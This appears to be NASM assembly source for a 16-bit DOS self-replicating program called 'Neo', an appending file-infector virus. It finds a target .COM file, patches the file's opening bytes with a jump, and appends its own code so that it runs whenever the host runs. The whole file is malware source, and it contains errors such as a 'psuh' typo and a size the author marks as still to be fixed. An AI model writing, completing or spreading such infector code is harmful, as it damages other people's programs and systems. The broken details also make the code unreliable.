; 16 bit Com file example
; nasm main.asm -fbin -o hello.com
; Neo is a self replicating program

org 100h

section .text

start:
	nop
	jmp NEO_BEGIN
	mov ah, 0x4c
	int 21h

NEO_BEGIN:
	; --- setup ---
	psuh cs
	push cs

	pop ds
	pop es

	call falso_proc

falso_proc:
	pop bp
	sub bp, 10Eh

	; --- Restore file ---
        mov di, 0100h

        lea si, [bp + buffer]

        mov al, byte[si]
        inc si

        mov byte[di], al
        inc di

        mov al, byte[si]
        inc si

        mov byte[di], al
        inc di

        mov al, byte[si]
        inc si

        mov byte[di], al
        inc di


	; --- find first file ---
	;clc ; clear carry
	;stc
	mov ah, 0x4e
	xor cx, cx
	lea dx, [bp + file_inf]
	int 21h


	lea cx, [bp + OPEN_FILE]
	lea dx, [bp + F_N_FOUND]

	cmovc cx, dx
	jmp cx

F_N_FOUND:

        ; File not found
        mov ah, 09h
        mov dx, msg_no_file
        int 21h

        lea ax, [bp + EXIT]
        jmp ax


OPEN_FILE:
	mov ah, 9h
	mov dx, msg_file
	int 21h

	; --- Open file ---
	mov ah, 3dh
	mov al, 00000010b
	mov dx, 009eh
	int 21h
	push ax

	pop bx
	push bx

;==============================================
; check if file is infected
;==============================================

	;read first 3 bytes
	mov ax, 3f00h
	mov cx, 3d
	lea dx, [bp  + buffer]
	int 21h

	; --- Move writer pointer to begining of file ---
	mov ax, 4200h
	xor cx, cx
	xor dx, dx
	int 21h

	; Write jmp to file
	mov ah, 40h
	mov cx, 1d

	add byte[bp + jump_op], 0xa8

	lea dx, [bp + jump_op]
	int 21h

	; get file_length
	mov si, 0x009a
	mov di, file_length

	mov ax, word[si]
	mov word[di], ax ; investigate why rep movsb does not work


	; write jmp address
	mov ah, 40h
	mov cx, 2
	lea dx, [bp + file_length]
	int 21h


	; move writer pointer to end
	mov ax, 4202h
	xor cx, cx
	xor dx, dx
	int 21h

	; Copy neo to the program
	pop bx ; restore handle
	mov ah, 40h
	mov cx, 237d  ; 244 -7, remove exit. change this to actual size of neo
	lea dx, [bp + NEO_BEGIN]
	int 21h


	; Close the file
	mov ah, 3eh
	int 21h

EXIT:
	;=========================
	mov ah, 09h
	lea dx, [bp + msg_end]
	int 21h
	;=========================


	mov ax, 100h
	jmp ax


;========================================
;========================================

section .data

	file_inf db 'infec.com', 0x0 ;

	file_length times 2 db 0x0, 0

	buffer times 3 db 0x90  ;bufffer to store bytes to restore

	jump_op db 'A', 0 

	msg_file db "file found", 0xd, 0xa, "$", 0
	msg_end db "End of NEO", 0xd, 0xa, "$",0
	msg_no_file db "No file found", 0xd, 0xa, "$", 0

